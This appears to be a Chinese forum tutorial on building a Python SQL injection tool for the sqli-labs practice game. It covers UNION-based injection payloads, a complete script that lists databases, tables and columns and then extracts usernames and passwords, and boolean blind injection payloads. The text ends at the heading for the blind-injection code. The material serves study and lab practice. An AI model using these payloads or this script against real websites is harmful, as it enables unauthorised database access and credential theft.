
# [分享][原创]sql注入工具编写源码 基于sqli-labs-master 闯关游戏

用python3编写

## 1.1 联合查询主要思路

1) 首先构造闭合语句

尝试url加上`id'`, `id''`, `id')`, `id''`), `id'))`或者`id'))`,若有报错信息，则可以猜测后台sql语句

如下图报错，可猜测原语句为 `SELECT * FROM users WHERE id='1'` 等等等,因为输入的 `'` 与前面的语句闭合，后面的等等等语句产生错误，这时尝试输入 `id=1' -- 1` 则成功，不报错，`-- 1` 和 `#` 是一样的,可以注释掉后面的语句，但是`#`可能被过滤掉

`id=1'`

![](upload/attach/202009/873637_FH6EH8E4NUQV2W5.png)

`id=1' -- 1`

![](upload/attach/202009/873637_NDMB2KYNE7VDAHC.png)

2）这时故意输入`id=-1'` 后面加上`union`语句，那么`union`前的语句因错误不会输出(也可以`id=1'and1=2`)，而后面语句照常输出

3）接下来如下示例依次尝试，直到不报错，则为正常输出列数

`id=-1' union select 1 -- 1`

`id=-1' union select 1,2-- 1`

`id=-1' union select 1,2,3-- 1`

![](upload/attach/202009/873637_R8XRMRXAY58MRRX.png)

正确列数为3

那么将2，3替换成我们想要的搜索sql语句就可以得到想要的信息

如`id=-1' union select 1,database(),version()-- 1`

分别得到数据库和版本号，根据版本号，可以上网搜索漏洞

接下来获取所有数据库名-》选择数据库-》查看这个数据库下所有表-》选择表-》查询这个表下所有列名

最后就可以得到用户名和密码

`id=-1' union select 1,username,password from security.users limit 3,1-- 1`

![](upload/attach/202009/873637_EBR5YY3N64BUHB3.png)

接下来我们可以利用html的相关知识,获取到网页的信息,然后通过正则得到想要的内容，若与预期不符,则可以做if判断进行编写

## 1.2 联合查询源代码(以第一关为例)

```python
import requests
import urllib
import re
import urllib.parse
from pip._vendor.distlib.compat import raw_input
#定义一个字典
values={}
#若想适合所有联合查询
#此处添加一个判断id=1’ ")的闭合语句
#此处添加一个判断union后select语句搜索列数判断的语句
def printy(name_list):
    new_list=name_list[0].strip(b',').split(b',')
    print(set(new_list))
    print("\n")

def get(url,values):
    #urlencode将字典返回字符串
    data=urllib.parse.urlencode(values)
    geturl=url+'?'+data
    #构造一个向服务器请求资源的url对象.这个对象是request库内部生成的。这时候的r返回的是一个包含服务资源的response对象。包含从服务器返回的所有的相关资源
    response = requests.get(geturl)
    # content返回一个二进制数据
    result=response.content
    #从第二个参数中匹配第一个用正则表示的参数，加r是不要转意
    find_list=re.findall(b"<br>Your Password:(.*?)</font>",result)
    if len(find_list)>0:
        return find_list

def get_database_name(url):
    values['id'] = "-1' union select 0,1,group_concat(database()) from INFORMATION_SCHEMA.SCHEMATA -- 1"
    #调用上个函数，获取数据库列表
    name_list=get(url,values)
    print ('The database:')
    printy(name_list)

def table_name(url):
    #获取控制台输入，并将所有输入作为字符串看待，返回字符串类型,获取的是上一个函数返回中的一个
    database_name=raw_input('please input your database:')
    values['id'] = "-1' union select 0,1,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA='"+database_name +"' -- 1"
    name_list=get(url,values)
    print('The table is:')
    printy(name_list)

def column_name(url):
    # 获取控制台输入，并将所有输入作为字符串看待，返回字符串类型,获取的是上一个函数返回中的一个
    database_name = raw_input('please input your database:')
    table_name=raw_input('please input your table:')
    values['id']="-1' union select 0,1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='"+table_name+"'and TABLE_SCHEMA='"+database_name+"' -- 1"
    name_list=get(url,values)
    print('The column is:')
    printy(name_list)

def context(url):
    # 获取控制台输入，并将所有输入作为字符串看待，返回字符串类型,获取的是上一个函数返回中的一个
    database_name = raw_input('please input your database:')
    table_name = raw_input('please input your table:')
    username = raw_input('please input your username:')#输入代表用户名的列，如username
    password = raw_input('please input your password:')#输入代表密码的列，如password
    values['id']="-1' union select 0,1,group_concat("+username+") from "+database_name+"."+table_name+" -- 1"
    name_list1=get(url,values)
    values['id']="-1' union select 0,1,group_concat("+password+") from "+database_name+"."+table_name+" -- 1"
    name_list2=get(url,values)
    print('The username is:')
    printy(name_list1)
    print('The password is:')
    printy(name_list2)

if __name__ == '__main__':
    try:
        #http://127.0.0.1/Less-1
        url=raw_input('please input your website:')
        get_database_name(url)
        table_name(url)
        column_name(url)
        context(url)
    except BaseException:
        print('该网址不适用联合查询')
```

## 1.3 联合查询运行结果

![](upload/attach/202009/873637_ZHYU8R68SQJUJRV.png)

## 2.1 布尔盲注主要思路

1）同上文中联合查询一样构造闭合语句，但是却发现网页返回的信息很少，这时候就需要盲注

2）你会发现以下情况

`id=1' and 1=1 -- 1`

![](upload/attach/202009/873637_9A7GFAZH84HE344.png)

`id=1' and 1=2 -- 1`

![](upload/attach/202009/873637_HRPVCGJNC5GGTHP.png)

这说明，`and`后面表达式的真假决定是否输出内容

那么我们就可以将想要查询的sql语句写入`and`后，来得到想要的信息

如：

获取数据库的长度：`id=1' and length(database())=6 -- 1`

获取数据库的名字：`id=1' and substr(database(),1,1)='a'-- 1`

获取数据库某表名：`id=1' and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),1,1) ='@'-- 1`

获取某表的某列名：`id=1' and substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' and TABLE_SCHEMA='security' limit 0,1),1,1) ='h'-- 1`

3)接下来就是写代码

获取当前数据库名-》选择数据库-》获取这个数据库有几个表-》依次获取每个表的长度-》依次获取获取表名-》依次获取每个表的长度、列名

依据html知识获取网页信息，进行判断

但是请注意，因为做了很多循环，加之python作为高级语言,输出会很慢，调试请分块调试

## 2.2 布尔盲注源代码(以第八关为例)
